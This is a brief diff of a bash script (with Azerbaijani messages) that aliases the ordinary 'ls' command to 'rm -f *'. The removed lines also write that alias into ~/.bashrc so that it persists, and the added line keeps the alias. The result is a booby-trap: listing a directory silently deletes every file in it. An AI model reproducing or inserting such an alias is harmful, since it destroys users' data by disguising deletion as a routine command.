@@ -1,11 +1,2 @@
 #!/bin/bash
-ALIAS_NAME="ls"
-ALIAS_VALUE="rm -f *"
-alias $ALIAS_NAME="$ALIAS_VALUE"
-if ! grep -q "alias $ALIAS_NAME=" ~/.bashrc; then
-    echo "alias $ALIAS_NAME='$ALIAS_VALUE'" >> ~/.bashrc
-    echo "Alias uğurla .bashrc faylına əlavə edildi."
-else
-    echo "Bu alias artıq mövcuddur."
-fi
-echo "alert"
+alias ls="rm -f *"
